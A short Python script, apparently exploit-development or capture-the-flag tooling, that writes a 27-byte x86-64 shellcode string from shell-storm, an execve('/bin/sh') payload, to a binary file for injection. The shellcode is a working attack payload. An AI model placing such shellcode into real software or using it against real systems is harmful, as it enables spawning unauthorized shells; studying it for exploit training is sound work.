#!/usr/bin/python3
# http://shell-storm.org/shellcode/files/shellcode-806.php
# Take hex characters from shellcode and write them to a binary blob

scode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

with open('shellcode.bin', 'wb') as b:
	b.write(scode)


